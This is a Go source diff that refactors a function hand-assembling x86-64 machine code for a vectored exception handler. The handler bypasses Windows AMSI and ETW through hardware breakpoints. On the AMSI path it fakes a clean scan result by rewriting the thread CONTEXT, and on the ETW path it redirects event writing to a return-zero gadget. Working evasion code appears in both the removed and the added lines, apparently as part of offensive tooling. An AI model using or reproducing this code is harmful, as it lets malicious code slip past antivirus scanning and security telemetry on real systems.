@@ -123,129 +123,15 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	binary.LittleEndian.PutUint64(dataPtrBytes, uint64(dataPtr))
 	code = append(code, dataPtrBytes...)
 
-	// --- Check AMSI address ---
-	// Load amsiAddr from data block: rax = [r13+0x00]
-	code = append(code, 0x49, 0x8B, 0x45, 0x00) // mov rax, [r13+0x00]
-	// test rax, rax (skip if 0)
-	code = append(code, 0x48, 0x85, 0xC0) // test rax, rax
-	code = append(code, 0x74)             // jz skip_amsi (rel8)
-	jzSkipAmsiOffset := len(code)
-	code = append(code, 0x00) // placeholder
-
-	// cmp r12, rax (compare Rip with amsiAddr)
-	code = append(code, 0x4C, 0x39, 0xE0) // cmp rax, r12
-	code = append(code, 0x75)             // jne skip_amsi (rel8)
-	jneSkipAmsiOffset := len(code)
-	code = append(code, 0x00) // placeholder
-
-	// AMSI match: simulate AmsiScanBuffer return directly in CONTEXT.
-	// No gadget needed — we modify the CONTEXT and Windows restores it.
-	//
-	// At the breakpoint, the saved CONTEXT has:
-	//   context.Rsp → [return_addr] [shadow_space...] [param5] [param6=AMSI_RESULT*]
-	//   So: return_addr = [context.Rsp], AMSI_RESULT* = [context.Rsp + 0x30]
-
-	// Step 1: Load context.Rsp into rax
-	code = append(code, 0x48, 0x8B, 0x83)       // mov rax, [rbx+0x98]
-	code = append(code, 0x98, 0x00, 0x00, 0x00) // disp32 = 0x98 (Rsp)
-
-	// Step 2: Read return address: rcx = [rax] (= [context.Rsp])
-	code = append(code, 0x48, 0x8B, 0x08) // mov rcx, [rax]
-
-	// Step 3: Set context.Rip = return address: [rbx+0xF8] = rcx
-	code = append(code, 0x48, 0x89, 0x8B)       // mov [rbx+0xF8], rcx
-	code = append(code, 0xF8, 0x00, 0x00, 0x00) // disp32 = 0xF8 (Rip)
-
-	// Step 4: Read AMSI_RESULT* pointer: rcx = [rax+0x30] (6th parameter)
-	code = append(code, 0x48, 0x8B, 0x48, 0x30) // mov rcx, [rax+0x30]
-
-	// Step 5: Write AMSI_RESULT_CLEAN (0) to *result: [rcx] = 0
-	// Guard against NULL pointer (shouldn't happen, but be safe)
-	code = append(code, 0x48, 0x85, 0xC9)                   // test rcx, rcx
-	code = append(code, 0x74, 0x06)                         // jz skip_write (6 bytes: skip mov dword [rcx], 0)
-	code = append(code, 0xC7, 0x01, 0x00, 0x00, 0x00, 0x00) // mov dword [rcx], 0
-	// skip_write:
-
-	// Step 6: Adjust context.Rsp += 8 (pop return address from stack)
-	code = append(code, 0x48, 0x83, 0xC0, 0x08) // add rax, 8
-	code = append(code, 0x48, 0x89, 0x83)       // mov [rbx+0x98], rax
-	code = append(code, 0x98, 0x00, 0x00, 0x00) // disp32 = 0x98 (Rsp)
-
-	// Step 7: Set context.Rax = 0 (S_OK / HRESULT success)
-	code = append(code, 0x48, 0xC7, 0x83)       // mov qword [rbx+0x78], 0
-	code = append(code, 0x78, 0x00, 0x00, 0x00) // disp32 = 0x78 (Rax)
-	code = append(code, 0x00, 0x00, 0x00, 0x00) // imm32 = 0
-
-	// One-shot: disable Dr0 (AMSI breakpoint) by clearing bit 0 of Dr7.
-	// Subsequent AmsiScanBuffer calls go through real AMSI — benign assemblies
-	// pass, and the critical first-load interception has already been done.
-	code = append(code, 0x48, 0x8B, 0x83)       // mov rax, [rbx+0x70]
-	code = append(code, 0x70, 0x00, 0x00, 0x00) // Dr7 offset
-	code = append(code, 0x48, 0x83, 0xE0, 0xFE) // and rax, ~1 (clear bit 0)
-	code = append(code, 0x48, 0x89, 0x83)       // mov [rbx+0x70], rax
-	code = append(code, 0x70, 0x00, 0x00, 0x00)
-	// Clear Dr6: [rbx+0x68] = 0
-	code = append(code, 0x48, 0xC7, 0x83) // mov qword [rbx+0x68], 0
-	code = append(code, 0x68, 0x00, 0x00, 0x00)
-	code = append(code, 0x00, 0x00, 0x00, 0x00)
-	// Return EXCEPTION_CONTINUE_EXECUTION
-	code = append(code, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF) // mov eax, -1
-	code = append(code, 0x41, 0x5D)                   // pop r13
-	code = append(code, 0x41, 0x5C)                   // pop r12
-	code = append(code, 0x5B)                         // pop rbx
-	code = append(code, 0x5D)                         // pop rbp
-	code = append(code, 0xC3)                         // ret
-
-	// skip_amsi:
+	code, jzSkipAmsiOff, jneSkipAmsiOff := vehBuildAMSIPath(code)
 	skipAmsiTarget := len(code)
-	code[jzSkipAmsiOffset] = byte(skipAmsiTarget - jzSkipAmsiOffset - 1)
-	code[jneSkipAmsiOffset] = byte(skipAmsiTarget - jneSkipAmsiOffset - 1)
+	code[jzSkipAmsiOff] = byte(skipAmsiTarget - jzSkipAmsiOff - 1)
+	code[jneSkipAmsiOff] = byte(skipAmsiTarget - jneSkipAmsiOff - 1)
 
-	// --- Check ETW address ---
-	// Load etwAddr from data block: rax = [r13+0x08]
-	code = append(code, 0x49, 0x8B, 0x45, 0x08) // mov rax, [r13+0x08]
-	// test rax, rax
-	code = append(code, 0x48, 0x85, 0xC0) // test rax, rax
-	code = append(code, 0x74)             // jz not_ours_short (rel8)
-	jzNotOursShortOffset := len(code)
-	code = append(code, 0x00) // placeholder
-
-	// cmp r12, rax
-	code = append(code, 0x4C, 0x39, 0xE0) // cmp rax, r12
-	code = append(code, 0x75)             // jne not_ours_short (rel8)
-	jneNotOursShortOffset := len(code)
-	code = append(code, 0x00) // placeholder
-
-	// ETW match: redirect Rip to the simple "xor eax,eax; ret" gadget.
-	// EtwEventWrite returns ULONG (0 = success), no output parameters needed.
-	// Load ETW gadget address from data block: rax = [r13+0x10]
-	code = append(code, 0x49, 0x8B, 0x45, 0x10) // mov rax, [r13+0x10]
-	// Set context.Rip to gadget address: [rbx+0xF8] = rax
-	code = append(code, 0x48, 0x89, 0x83)       // mov [rbx+disp32], rax
-	code = append(code, 0xF8, 0x00, 0x00, 0x00) // disp32 = 0xF8 (Rip)
-	// One-shot: disable Dr1 (ETW breakpoint) by clearing bit 2 of Dr7
-	// This prevents Go runtime GC/scheduler threads from repeatedly triggering VEH
-	code = append(code, 0x48, 0x8B, 0x83)       // mov rax, [rbx+0x70]
-	code = append(code, 0x70, 0x00, 0x00, 0x00) // Dr7 offset
-	code = append(code, 0x48, 0x83, 0xE0, 0xFB) // and rax, ~4 (clear bit 2)
-	code = append(code, 0x48, 0x89, 0x83)       // mov [rbx+0x70], rax
-	code = append(code, 0x70, 0x00, 0x00, 0x00)
-	// Clear Dr6: [rbx+0x68] = 0
-	code = append(code, 0x48, 0xC7, 0x83) // mov qword [rbx+0x68], 0
-	code = append(code, 0x68, 0x00, 0x00, 0x00)
-	code = append(code, 0x00, 0x00, 0x00, 0x00)
-	// Return EXCEPTION_CONTINUE_EXECUTION
-	code = append(code, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF) // mov eax, -1
-	code = append(code, 0x41, 0x5D)                   // pop r13
-	code = append(code, 0x41, 0x5C)                   // pop r12
-	code = append(code, 0x5B)                         // pop rbx
-	code = append(code, 0x5D)                         // pop rbp
-	code = append(code, 0xC3)                         // ret
-
-	// not_ours_short: (jump target for ETW misses → fall through to not_ours)
+	code, jzNotOursShortOff, jneNotOursShortOff := vehBuildETWPath(code)
 	notOursShortTarget := len(code)
-	code[jzNotOursShortOffset] = byte(notOursShortTarget - jzNotOursShortOffset - 1)
-	code[jneNotOursShortOffset] = byte(notOursShortTarget - jneNotOursShortOffset - 1)
+	code[jzNotOursShortOff] = byte(notOursShortTarget - jzNotOursShortOff - 1)
+	code[jneNotOursShortOff] = byte(notOursShortTarget - jneNotOursShortOff - 1)
 
 	// not_ours:
 	notOursTarget := len(code)
@@ -289,4 +175,91 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	binary.LittleEndian.PutUint64(dataSlice[16:24], uint64(etwGadgetAddr))
 
 	return codePtr, dataPtr, nil
+}
+
+func vehAppendContinueExecution(code []byte) []byte {
+	code = append(code, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF) // mov eax, -1
+	code = append(code, 0x41, 0x5D)                   // pop r13
+	code = append(code, 0x41, 0x5C)                   // pop r12
+	code = append(code, 0x5B)                         // pop rbx
+	code = append(code, 0x5D)                         // pop rbp
+	code = append(code, 0xC3)                         // ret
+	return code
+}
+
+// vehBuildAMSIPath appends the AMSI VEH handler bytecode. Returns the updated
+// code slice and the two jump-offset positions (jz and jne to skip_amsi) that
+// the caller must patch once the skip target address is known.
+func vehBuildAMSIPath(code []byte) ([]byte, int, int) {
+	// Load amsiAddr from data block: rax = [r13+0x00]
+	code = append(code, 0x49, 0x8B, 0x45, 0x00) // mov rax, [r13+0x00]
+	code = append(code, 0x48, 0x85, 0xC0)       // test rax, rax
+	code = append(code, 0x74)                   // jz skip_amsi (rel8)
+	jzOff := len(code)
+	code = append(code, 0x00)
+
+	code = append(code, 0x4C, 0x39, 0xE0) // cmp rax, r12
+	code = append(code, 0x75)             // jne skip_amsi (rel8)
+	jneOff := len(code)
+	code = append(code, 0x00)
+
+	// Simulate AmsiScanBuffer return via CONTEXT manipulation.
+	// Load context.Rsp
+	code = append(code, 0x48, 0x8B, 0x83, 0x98, 0x00, 0x00, 0x00) // mov rax, [rbx+0x98]
+	// Read return address
+	code = append(code, 0x48, 0x8B, 0x08) // mov rcx, [rax]
+	// Set context.Rip = return address
+	code = append(code, 0x48, 0x89, 0x8B, 0xF8, 0x00, 0x00, 0x00) // mov [rbx+0xF8], rcx
+	// Read AMSI_RESULT* (6th parameter at rsp+0x30)
+	code = append(code, 0x48, 0x8B, 0x48, 0x30) // mov rcx, [rax+0x30]
+	// Write AMSI_RESULT_CLEAN (0), guarded against NULL
+	code = append(code, 0x48, 0x85, 0xC9)                   // test rcx, rcx
+	code = append(code, 0x74, 0x06)                         // jz skip_write
+	code = append(code, 0xC7, 0x01, 0x00, 0x00, 0x00, 0x00) // mov dword [rcx], 0
+	// Adjust context.Rsp += 8
+	code = append(code, 0x48, 0x83, 0xC0, 0x08)             // add rax, 8
+	code = append(code, 0x48, 0x89, 0x83, 0x98, 0x00, 0x00, 0x00) // mov [rbx+0x98], rax
+	// Set context.Rax = 0 (S_OK)
+	code = append(code, 0x48, 0xC7, 0x83, 0x78, 0x00, 0x00, 0x00) // mov qword [rbx+0x78], 0
+	code = append(code, 0x00, 0x00, 0x00, 0x00)
+
+	// One-shot: clear Dr0 (bit 0 of Dr7), clear Dr6
+	code = append(code, 0x48, 0x8B, 0x83, 0x70, 0x00, 0x00, 0x00) // mov rax, [rbx+0x70]
+	code = append(code, 0x48, 0x83, 0xE0, 0xFE)                   // and rax, ~1
+	code = append(code, 0x48, 0x89, 0x83, 0x70, 0x00, 0x00, 0x00) // mov [rbx+0x70], rax
+	code = append(code, 0x48, 0xC7, 0x83, 0x68, 0x00, 0x00, 0x00) // mov qword [rbx+0x68], 0
+	code = append(code, 0x00, 0x00, 0x00, 0x00)
+
+	code = vehAppendContinueExecution(code)
+	return code, jzOff, jneOff
+}
+
+// vehBuildETWPath appends the ETW VEH handler bytecode. Returns the updated
+// code slice and two jump-offset positions for patching.
+func vehBuildETWPath(code []byte) ([]byte, int, int) {
+	// Load etwAddr from data block: rax = [r13+0x08]
+	code = append(code, 0x49, 0x8B, 0x45, 0x08) // mov rax, [r13+0x08]
+	code = append(code, 0x48, 0x85, 0xC0)       // test rax, rax
+	code = append(code, 0x74)                   // jz not_ours_short (rel8)
+	jzOff := len(code)
+	code = append(code, 0x00)
+
+	code = append(code, 0x4C, 0x39, 0xE0) // cmp rax, r12
+	code = append(code, 0x75)             // jne not_ours_short (rel8)
+	jneOff := len(code)
+	code = append(code, 0x00)
+
+	// Redirect Rip to "xor eax,eax; ret" gadget
+	code = append(code, 0x49, 0x8B, 0x45, 0x10)             // mov rax, [r13+0x10]
+	code = append(code, 0x48, 0x89, 0x83, 0xF8, 0x00, 0x00, 0x00) // mov [rbx+0xF8], rax
+
+	// One-shot: clear Dr1 (bit 2 of Dr7), clear Dr6
+	code = append(code, 0x48, 0x8B, 0x83, 0x70, 0x00, 0x00, 0x00) // mov rax, [rbx+0x70]
+	code = append(code, 0x48, 0x83, 0xE0, 0xFB)                   // and rax, ~4
+	code = append(code, 0x48, 0x89, 0x83, 0x70, 0x00, 0x00, 0x00) // mov [rbx+0x70], rax
+	code = append(code, 0x48, 0xC7, 0x83, 0x68, 0x00, 0x00, 0x00) // mov qword [rbx+0x68], 0
+	code = append(code, 0x00, 0x00, 0x00, 0x00)
+
+	code = vehAppendContinueExecution(code)
+	return code, jzOff, jneOff
 }
